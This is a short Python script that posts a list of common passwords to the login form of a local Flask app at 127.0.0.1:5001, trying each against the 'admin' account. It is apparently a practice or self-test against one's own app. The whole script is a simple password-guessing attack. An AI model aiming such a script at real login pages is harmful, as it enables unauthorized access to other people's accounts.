import requests
import time

url = "http://127.0.0.1:5001/"  # Your local Flask app URL
username = "admin"  # Target username
passwords = ["1234", "admin", "password", "admin123", "letmein", "123456"]  # Common passwords

for pwd in passwords:
    response = requests.post(url, data={"username": username, "password": pwd})
    print(f"Trying {pwd}: {response.text}")
    time.sleep(1)  # Wait for 1 second between attempts
